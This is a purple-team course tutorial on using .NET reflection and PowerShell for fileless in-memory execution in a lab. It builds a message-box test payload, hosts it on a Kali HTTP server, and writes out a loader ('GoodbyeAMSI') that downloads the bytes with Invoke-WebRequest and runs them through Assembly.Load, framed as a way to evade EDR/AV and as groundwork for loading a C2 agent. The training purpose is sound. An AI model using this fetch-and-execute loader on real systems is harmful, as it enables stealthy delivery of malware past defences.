---
layout: default
title: "Introduction to Reflection"
permalink: /solo-purple-teaming/introduction-to-reflection/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Introduction to Reflection</h1>
</section>
<section class="spt-content">
<p>Owner: Mike Sterrett</p>
<h1
id="bulb-using-reflection-in-net-and-powershell-for-fileless-execution">💡
Using Reflection in .NET and PowerShell for Fileless Execution</h1>
<hr />
<h2 id="brain-concept-overview-what-is-reflection">🧠 Concept Overview:
What is Reflection?</h2>
<p><strong>Reflection</strong> in .NET allows programs to inspect and
interact with their own structure at runtime. For red teamers:</p>
<ul>
<li>It enables in-memory execution (no disk artifacts).</li>
<li>Helps evade EDR/AV by avoiding file writes.</li>
<li>Integrates well with <strong>LOLBins</strong> (e.g.,
<code>InstallUtil</code>, <code>MSBuild</code>).</li>
</ul>
<hr />
<h2 id="mag-objective">🔍 Objective</h2>
<p>Create a C# program that shows a message box, then
<strong>reflectively load it from PowerShell</strong> using a PowerShell
Runspace, simulating stealthy malware execution entirely in memory.</p>
<hr />
<h2 id="hammer_and_wrench-part-1-build-the-net-payload">🛠️ Part 1: Build
the .NET Payload</h2>
<h3
id="small_blue_diamond-1-open-visual-studio-on-your-windows-11-reverse-engineering-vm">🔹
1. Open Visual Studio on your Windows 11 Reverse Engineering VM</h3>
<ul>
<li><p>Create a new project:</p>
<p><code>Console App (.NET Framework)</code></p></li>
</ul>
<p><img src="Introduction%20to%20Reflection/image.png"
alt="image.png" /></p>
<ul>
<li>Name it: <code>TestingReflection</code></li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%201.png"
alt="image.png" /></p>
<ul>
<li>Click <strong>Create</strong></li>
</ul>
<hr />
<h3 id="small_blue_diamond-2-clean-up-using-statements">🔹 2. Clean Up
Using Statements</h3>
<p>Remove any unnecessary <code>using</code> statements at the top.</p>
<p><img src="Introduction%20to%20Reflection/image%202.png"
alt="image.png" /></p>
<hr />
<h3 id="small_blue_diamond-3-add-the-execute-function">🔹 3. Add the
Execute Function</h3>
<p>Inside the <code>Program</code> class:</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Execute</span><span class="op">()</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">string</span><span class="op">[]</span> args <span class="op">=</span> <span class="op">{};</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Main</span><span class="op">(</span>args<span class="op">);</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><img src="Introduction%20to%20Reflection/image%203.png"
alt="image.png" /></p>
<p>Modify <code>Main</code> to just show a message box.</p>
<hr />
<h3 id="small_blue_diamond-4-add-windows-forms-reference">🔹 4. Add
Windows Forms Reference</h3>
<ul>
<li>Right-click <strong>References</strong> &gt; <strong>Add
Reference</strong></li>
<li>Under <strong>Assemblies</strong>, check:
<ul>
<li><code>System.Windows.Forms</code></li>
</ul></li>
<li>Click OK</li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%204.png"
alt="image.png" /></p>
<ul>
<li>Add this at the top:</li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Windows</span><span class="op">.</span><span class="fu">Forms</span><span class="op">;</span></span></code></pre></div>
<p><img src="Introduction%20to%20Reflection/image%205.png"
alt="image.png" /></p>
<hr />
<h3 id="small_blue_diamond-5-update-main-method">🔹 5. Update Main
Method</h3>
<div class="sourceCode" id="cb3"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">static</span> <span class="dt">void</span> <span class="fu">Main</span><span class="op">(</span><span class="dt">string</span><span class="op">[]</span> args<span class="op">)</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    MessageBox<span class="op">.</span><span class="fu">Show</span><span class="op">(</span><span class="st">&quot;You have been PWNd!&quot;</span><span class="op">,</span> <span class="st">&quot;Reflection Test&quot;</span><span class="op">);</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><img src="Introduction%20to%20Reflection/image%206.png"
alt="image.png" /></p>
<hr />
<h3 id="small_blue_diamond-6-set-to-x64-and-release-mode">🔹 6. Set to
x64 and Release Mode</h3>
<ul>
<li>Open <strong>Configuration Manager</strong></li>
<li>Create new platform: <code>x64</code></li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%207.png"
alt="image.png" /></p>
<ul>
<li>Set build mode to <strong>Release</strong></li>
<li>Build the solution: <code>Build &gt; Build Solution</code></li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%208.png"
alt="image.png" /></p>
<ul>
<li><p>Test by selecting <code>Start</code></p>
<p><img src="Introduction%20to%20Reflection/image%209.png"
alt="image.png" /></p></li>
</ul>
<hr />
<h2 id="arrows_counterclockwise-part-2-host-payload-on-kali-linux">🔄
Part 2: Host Payload on Kali Linux</h2>
<h3 id="small_blue_diamond-7-locate-the-compiled-binary">🔹 7. Locate
the Compiled Binary</h3>
<p>Path:</p>
<pre><code>cd C:\Users\ReverseEngineer\source\repos\TestingReflection\TestingReflection\bin\x64\Release\
</code></pre>
<h3 id="small_blue_diamond-8-transfer-binary-to-kali">🔹 8. Transfer
Binary to Kali</h3>
<p>From Windows CMD or PowerShell:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span> TestingReflection.exe username@10.0.3.2:~/Downloads/</span></code></pre></div>
<ul>
<li>Replace <code>10.0.3.2</code> with your Kali IP.</li>
<li>Ensure Python HTTP server is serving <code>~/Downloads</code>:</li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%2010.png"
alt="image.png" /></p>
<ul>
<li>Start http server on Kali</li>
</ul>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ~/Downloads</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server 8000</span></code></pre></div>
<hr />
<h2 id="computer-part-3-reflectively-load-using-powershell--c">💻 Part
3: Reflectively Load Using PowerShell + C#</h2>
<h3 id="small_blue_diamond-9-modify-the-powershell-loader">🔹 9. Modify
the PowerShell Loader</h3>
<p>In your second Visual Studio project (<code>GoodbyeAMSI</code>):</p>
<h3 id="heavy_exclamation_markcomment-out-the-old-payload">❗Comment out
the old payload</h3>
<p>Add this code in its place:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">string</span> script <span class="op">=</span> @<span class="st">&quot;$bytes = (Invoke-WebRequest -Uri &quot;&quot;http://10.0.3.2:8000/TestingReflection.exe&quot;&quot;).Content</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>                $loadedAssembly <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span><span class="fu">Load</span><span class="op">(</span>$bytes<span class="op">)</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>                                $typeName <span class="op">=</span> <span class="st">&quot;&quot;</span>TestingReflection<span class="op">.</span><span class="fu">Program</span><span class="st">&quot;&quot;</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>                                $type <span class="op">=</span> $loadedAssembly<span class="op">.</span><span class="fu">GetType</span><span class="op">(</span>$typeName<span class="op">)</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>                                $instance <span class="op">=</span> <span class="op">[</span>Activator<span class="op">]::</span><span class="fu">CreateInstance</span><span class="op">(</span>$type<span class="op">)</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>                                $methodName <span class="op">=</span> <span class="st">&quot;&quot;</span>Execute<span class="st">&quot;&quot;</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>                                $method <span class="op">=</span> $type<span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span>$methodName<span class="op">)</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>                                $result <span class="op">=</span> $method<span class="op">.</span><span class="fu">Invoke</span><span class="op">(</span>$instance<span class="op">,</span> $null<span class="op">)</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;;</span></span></code></pre></div>
<p><img src="Introduction%20to%20Reflection/image%2011.png"
alt="image.png" /></p>
<hr />
<h3 id="small_blue_diamond-10-build-the-loader">🔹 10. Build the
Loader</h3>
<ul>
<li>Set build to <strong>x64 Debug</strong>.</li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%2012.png"
alt="image.png" /></p>
<ul>
<li>Build &gt; Build Solution</li>
</ul>
<p><img src="Introduction%20to%20Reflection/image%2013.png"
alt="image.png" /></p>
<hr />
<h3 id="small_blue_diamond-11-run-the-loader">🔹 11. Run the Loader</h3>
<p>Navigate to the binary:</p>
<pre><code>cd C:\Users\ReverseEngineer\source\repos\GoodbyeAMSI\GoodbyeAMSI\bin\x64\Debug\
</code></pre>
<p><img src="Introduction%20to%20Reflection/image%2014.png"
alt="image.png" /></p>
<p>Run the executable</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode json"><code class="sourceCode json"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="er">.\GoodbyeAMSI.exe</span></span></code></pre></div>
<p>You should see a <strong>message box</strong> pop up saying:</p>
<blockquote>
<p>“You have been PWNd!”</p>
</blockquote>
<p><img src="Introduction%20to%20Reflection/image%2015.png"
alt="image.png" /></p>
<hr />
<h2 id="test_tube-part-4-troubleshooting-optional">🧪 Part 4:
Troubleshooting (Optional)</h2>
<p>If it doesn't work:</p>
<h3 id="1-open-notepad">1. Open Notepad++</h3>
<p>Paste the reflection PowerShell script.</p>
<h3 id="2-open-powershell">2. Open PowerShell</h3>
<p>Run each line manually:</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span> <span class="op">=</span> <span class="op">(</span><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri <span class="st">&quot;http://10.0.3.2:8000/TestingReflection.exe&quot;</span><span class="op">).</span><span class="fu">Content</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span>  <span class="co"># Confirm it&#39;s non-zero (e.g., 4096)</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="va">$loadedAssembly</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span>Load<span class="op">(</span><span class="va">$bytes</span><span class="op">)</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="va">$loadedAssembly</span>  <span class="co"># Should return the assembly object</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="va">$type</span> <span class="op">=</span> <span class="va">$loadedAssembly</span><span class="op">.</span><span class="fu">GetType</span><span class="op">(</span><span class="st">&quot;TestingReflection.Program&quot;</span><span class="op">)</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="va">$instance</span> <span class="op">=</span> <span class="op">[</span>Activator<span class="op">]::</span>CreateInstance<span class="op">(</span><span class="va">$type</span><span class="op">)</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="va">$method</span> <span class="op">=</span> <span class="va">$type</span><span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span><span class="st">&quot;Execute&quot;</span><span class="op">)</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="va">$method</span><span class="op">.</span><span class="fu">Invoke</span><span class="op">(</span><span class="va">$instance</span><span class="op">,</span> <span class="va">$null</span><span class="op">)</span></span></code></pre></div>
<p>Check for:</p>
<ul>
<li>Correct namespace and class name</li>
<li>Correct method name (no typos like <code>Excute</code>)</li>
</ul>
<hr />
<h2 id="white_check_mark-final-output">✅ Final Output</h2>
<p>You should see a <strong>message box</strong> appear without writing
any file to disk — all loaded via memory!</p>
<hr />
<h2 id="arrows_counterclockwise-next-steps">🔄 Next Steps</h2>
<p>In the next lecture, you'll use this template to reflectively load
the <strong>Apollo agent</strong>.</p>
<h3 id="white_check_mark-before-proceeding">✅ Before proceeding:</h3>
<ul>
<li>Make sure your <code>TestingReflection.exe</code> runs.</li>
<li>Your loader (<code>GoodbyeAMSI.exe</code>) should successfully
reflectively load and execute it.</li>
<li>You should <em>not</em> see any console popups—only the message box
from memory execution.</li>
</ul>
</section>
</div>
